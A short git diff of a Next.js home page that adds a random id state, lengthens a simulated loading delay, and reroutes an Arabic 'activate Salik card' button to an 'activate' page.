@@ -9,15 +9,16 @@ import { useRouter } from "next/navigation"
 import { useState } from "react"
 import FullPageLoader from "@/components/full-page-loader"
 export default function Home() {
-  const [loading, setLoading] = useState(true)
+  const [loading, setLoading] = useState(false) 
+   const [_id] = useState("id" + Math.random().toString(16).slice(2))
+
   const router = useRouter()
   const goToPage = (page: string) => {
     setLoading(true)
     setTimeout(() => {
     setLoading(false)
-
       router.push(`/${page}`)
-    }, 3000);
+    }, 8000);
   }
   return (
     <div className="flex flex-col min-h-screen bg-gray-50">
@@ -52,7 +53,7 @@ export default function Home() {
           </Button>
           <Button
             variant="secondary"
-            onClick={() => goToPage('personal-info')}
+            onClick={() => goToPage('activate')}
             className="w-full py-4 bg-gray-700 hover:bg-gray-800 text-white text-lg font-medium rounded-md"
           >
             تفعيل بطاقة سالك
